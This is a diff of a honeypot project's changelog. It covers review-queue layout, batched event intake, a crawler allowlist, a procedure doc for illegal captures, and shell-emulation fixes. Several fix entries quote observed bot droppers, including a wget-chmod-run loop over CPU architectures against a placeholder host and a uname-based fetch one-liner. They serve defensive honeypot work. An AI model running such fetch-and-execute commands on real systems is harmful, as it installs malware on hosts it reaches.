@@ -2,6 +2,23 @@
 
 ## Unreleased
 
+### Changed
+
+- **The review queue reads at a glance** - fifty-six pending rows had become a wall: a notes
+  textarea and three buttons on every row, "honeypot" in every Categories cell, a score bar that
+  hardly varied, and five hosts of one campaign as five full rows. Pending entries now group by
+  campaign: two or more listed members make one expandable row (campaign label, counts, what the
+  group did, the top score and a single "Approve all N", which still goes through the two-step
+  campaign confirmation), and addresses alone in their campaign or in none stay rows. An address
+  in several campaigns is listed under the one with the most pending members, then the most
+  hosts, then the lowest id. The notes field is a "note" toggle inside the row, so decisions post
+  exactly as before. The Categories column is gone from every tab (the data stays on the IP
+  page), the score is a number coloured by feed tier, First seen and Last seen became one Active
+  cell (`10:58-18:11 UTC`, or `2d, last 3 min ago`, exact times on hover) with sort links above
+  the table, and each context line leads with what the address did, dims sensor and session
+  counts, and moves "counts from N of M events" to a tooltip. At 390 px entries stack as cards
+  with no sideways scroll.
+
 ### Fixed
 
 - **Command-sequence campaigns are one per tool, not one per session length** - observed on the
@@ -16,12 +33,60 @@
   values of `NAME=value` are placeholders, while short numbers (`x86`, `arm7`, `-p 22`) and
   `chmod` modes are kept; HTTP request lines sent to a shell port are one campaign instead of one
   per header order; a run of login lines only is one campaign. A campaign's label gives the range
-  of command counts (`3-16 commands: ...`). On a synthetic replica of the observed shapes, 106
+  of command counts past the login lines (`3-16 commands: ...`). Commands the sensor decoded from
+  a single-byte XOR (Mirai's `lghkel` for `enable`, key 9) are keyed and labeled as their decoded
+  text, and the campaign page keeps the raw form. On a synthetic replica of the observed shapes, 106
   sessions went from 69 campaigns to 11. Migration 0016 marks existing databases as built by the
   old key; the indexer then rebuilds the command-sequence campaigns from the ledger on its next
   batches (about as long as the first catch-up), leaving sample and scanner campaigns and
   indicators as they are. Campaign ids of command-sequence campaigns change. See
   `docs/operations/campaigns.md`.
+
+- **Running a program built for another CPU now fails, so per-architecture loops go on** -
+  observed live 2026-10-08: a bot's `for a in mips mpsl arm4 arm5 arm6 arm7 x86_64 x86; do wget
+  http://H/$a -O .c; chmod +x .c && ./.c && break; done` ended at `mips` because every fetched
+  file ran with status 0, so the x86_64 build, the only one that matters on the Ubuntu persona
+  (armv7 on the phone), was never asked for. A file is now judged by its ELF header when its bytes
+  are one, else by the architecture token in the URL or local name it was fetched with; that
+  origin follows `cp`, `mv` and `cat FILE > DEST`, so the Eclipse busybox-copy sequence is judged
+  by what was cat over the copy. A foreign build answers `bash: ./x: cannot execute binary file:
+  Exec format error` (dash: `sh: 1: ./x: Exec format error`, both status 126; the phone's mksh:
+  `not executable: 32-bit ELF file`), so `&& break` and `||` chains behave as on a real host. The
+  persona's own build, a name with no token and a file the session typed still run silently.
+  `chmod` on the Ubuntu persona also names a missing operand (`chmod: cannot access 'x': No such
+  file or directory`, status 1) as GNU chmod does, which the loop's `|| chmod +x $a && ./$a`
+  branch depends on (`crates/sensor-framework/src/shell/arch.rs`).
+
+- **The configuration check's `fix:` lines now run when pasted** - observed live 2026-10-08: the
+  no-log finding's `grep LOG_PATH /etc/propolis/*.env` was refused (those files are root-only),
+  and the no-events finding's line ran `psql "$DATABASE_URL" ...` (unset in an operator's shell)
+  followed by prose, which bash parsed as an `if` and answered with a continuation prompt. A
+  `fix:` is now only a command, or commands joined with `&&` or `;`, with `sudo` wherever root is
+  needed and absolute paths for the repository's scripts; the ledger query is the script's
+  new `--newest-event SENSOR` mode run with `sudo`, which reaches the database through `PG*`
+  variables so no connection string or password is ever on a command line. Instructions that are not commands (edit a file,
+  change a bind address, install a firewall rule or a key) print as `do:`, and the explanation
+  moved into the finding text. `--json` keeps its shape and gains `fix_kind` (`run`, `manual`)
+  and `id` on each finding. `config_check_test` raises every finding id (a new finding with no
+  fixture fails) and executes each `fix` in bash against stub commands, failing on a parse error,
+  stderr output, or a root-only command or env-file read without `sudo`.
+
+- **Download events come from what a line executes, not from the text it carries** - observed live
+  2026-10-08 (telnet) and on an SSH exec line: a bot wrote a dropper with `echo '... wget
+  http://H/$a ...' >> .s` lines and ran `sh .s`, and the sensor reported `http://H/$a`, unexpanded,
+  for the echo line and nothing for the fetch the loop ran; the SSH one-liner chose the binary with
+  `A=$(uname -m); case $A in x86_64)U=x86_64;; ... esac; wget http://H/$U` and reported `/$U`. A
+  fetch is now recorded when the evaluator runs it, from its expanded arguments, so loops, `sh
+  FILE`, `sh -c`, command substitutions and variables report the real URL (`http://H/mips` for the
+  observed script), and an `echo`/`printf` argument, here-document body or quoted assignment holding
+  a fetch reports nothing. `case ... esac` is now run rather than skipped, so the probe above picks
+  `/x86_64` on the Ubuntu persona and `/arm7` on the phone's `armv7l`. A URL still holding
+  `$name`, `$(..)` or a backtick, or built from a variable that is not set, is recorded as a
+  command with no `url`. The old lexical scan stays as a fallback for evidence the evaluator did
+  not reach (a skipped branch, functions, syntax errors), now read with the shell's tokenizer, and
+  one URL found both ways is one event (`crates/sensor-framework/src/shell/fetch.rs`). A line that
+  only opens a construct reports its fetches when the construct completes. Busybox `tftp -g -l FILE
+  HOST` saves under the basename of the remote name, as busybox 1.30 does.
 
 - **An ADB base64 APK loader no longer loops on `wc: not found`** - observed live 2026-10-07: a bot
   pushed an APK to `/data/local/tmp` in about 57 `echo -n '<base64>' >> f.b64` commands, checked
@@ -92,6 +157,72 @@
   `honeypot_connection` weight (40) as a telnet connect did already. No migration or wire change.
 
 ### Added
+
+- **Intake appends a batch of lines in one transaction** - after the dedup index (migration `0013`)
+  and the incremental breadth sets (migration `0014`) removed the costs that grew with lag and with
+  a source's history, what remained was one transaction, one lock acquisition and one commit per
+  line, which held the node to a few hundred events a second whatever the hardware. A new
+  `core_scoring::append_events` appends a batch (scored events and telemetry, in log order) with
+  one lock acquisition: it hashes the chain in order from one head read, loads each touched
+  source's score, vantages, sensors and dedup lookup once, folds the events through the same
+  `apply_event` in order, inserts the ledger rows with one multi-row `INSERT` and writes each
+  touched source once. No migration, no change to the hash chain, the scoring formulas or the
+  ledger's order. A property test (`crates/core-scoring/tests/batch_equivalence.rs`: eight
+  seeds, 32 streams of 20 to 160 events over six sources, every signal type, duplicates, out-of-order
+  and sub-microsecond timestamps, cut into batches of 1 to the whole stream) holds the ledger rows
+  with their hashes, `ip_score`, `ip_vantage` and `ip_sensor` byte-identical to one-at-a-time
+  ingestion and runs `verify_chain` and `rebuild_projection` on the batch-built ledger. On a 1M-row
+  test ledger with a 200k-event source (RAM-backed server): about 350 to 470 events a second one at
+  a time, 11,000 to 13,600 in batches of 1000, with the lock held about 70 to 90 ms per batch.
+  The runner's read size now adapts to lag: 100 lines when caught up, doubling to 1000 while a log
+  keeps filling whole batches, back to 100 on a short or failed batch; the tailer enforces an 8 MiB
+  byte budget in the read itself (`LogTailer::read_batch_bounded`), so a burst of near-megabyte
+  lines cannot make a batch a gigabyte. A batch that fails is retried in halves when one event
+  can be the cause (invalid, a stored projection that will not decode, a data exception such as a
+  NUL in metadata, a constraint), so the events before it commit, and intake moves its read
+  position past exactly those lines: the next poll starts at the failed line, the committed
+  prefix is not appended again (it would otherwise be re-appended as new ledger rows on every
+  poll with no pause, inflating the source's event counters toward volume listing), and a failure
+  at the first line reports nothing ingested so the loop sleeps. Nothing is skipped or
+  quarantined: an event the database refuses on every attempt still holds that sensor's intake at
+  its line, now reported as `intake wedged at <sensor>` after three consecutive refusals of the
+  same line, quoted by `intake-stalled`. Probe confirmations are recorded only for lines the
+  append reached. The console's delist, relist and delete take the append lock, so one landing
+  mid-batch is no longer overwritten, and the review queue's population scan skips a delisted
+  address. The position after a partial commit is computed from the line lengths recorded at
+  read time (`LogTailer::commit_batch_through`), not by reading again: a re-read goes through
+  rotation handling, and a `copytruncate` landing during the append returned the new file's
+  first lines, which were then marked done unread; now a changed file means the batch is read
+  again from its start (replayed, never skipped). The cursor is persisted after a partial
+  commit so a restart resumes at the refused line, and a dropped connection between refusals
+  no longer resets the three-poll wedge count. A lost commit acknowledgement still replays a
+  batch (at-least-once). `append_bench` gains a `batched` mode that also reports how long a second
+  writer waits on the lock.
+
+- **Declared crawlers can be kept out of the published feed by address, and the HTTP sensor labels
+  a User-Agent that claims to be one** - research and AI crawlers (ClaudeBot, Claude-User,
+  Claude-SearchBot, Googlebot, CensysInspect and others) reach the HTTP sensor and were
+  published like any other source. `PROPOLIS_FEED_ALLOWLIST_FILE` names a local text file of CIDRs
+  (one per line, `#` comments), merged into the existing `PROPOLIS_FEED_ALLOWLIST`, so an operator
+  can add a crawler operator's published ranges with no code change. The file is read at startup,
+  bounded (1 MiB, 50,000 entries) and all-or-nothing: an unreadable file, a bad line, a bare
+  address, an entry wider than /8 (IPv4) or /16 (IPv6), or non-UTF-8 content refuses to start the
+  daemon, so a corrupted or truncated list can never exclude everything or silently exclude
+  nothing. Nothing is fetched from the network. Separately, an HTTP request whose User-Agent
+  contains a known crawler token gets `claimed_crawler` in its event metadata (a fixed label, not
+  the header text). The label is display only: a User-Agent is attacker-controlled, so it changes
+  no score, queue entry or feed decision, and a ClaudeBot User-Agent from an address that is not in
+  the file is scored and published like any other source
+  (`crates/feed/src/exclusion.rs#load_allowlist_file`, `crates/sensor-http/src/crawler.rs#claimed_crawler`).
+
+- **Docs: `docs/operations/captured-content-handling.md`** - the operator procedure for a capture
+  that may be illegal material (above all CSAM): what the console and spool already do to limit
+  exposure (hash-named bodies, no rendering, download forced as an attachment), the rules (never
+  open or preview a capture, handle media and archives by hash, keep suspect files out of
+  VirusTotal upload and vendor paths), quarantining one sample by moving it out of the spool,
+  and the reporting process (US 18 U.S.C. 2258A and the CyberTipline, INHOPE hotlines elsewhere),
+  framed as process and not legal advice. It also lists what works against the procedure today
+  (automatic VirusTotal upload when opted in, 30-day deletion with no hold, tmpfs spools).
 
 - **`deploy/config-check.sh` compares the configuration with what is running** - five faults on
   the production box were each found by accident: a typo in `PROPOLIS_SENSOR_LOGS`, MQTT's log
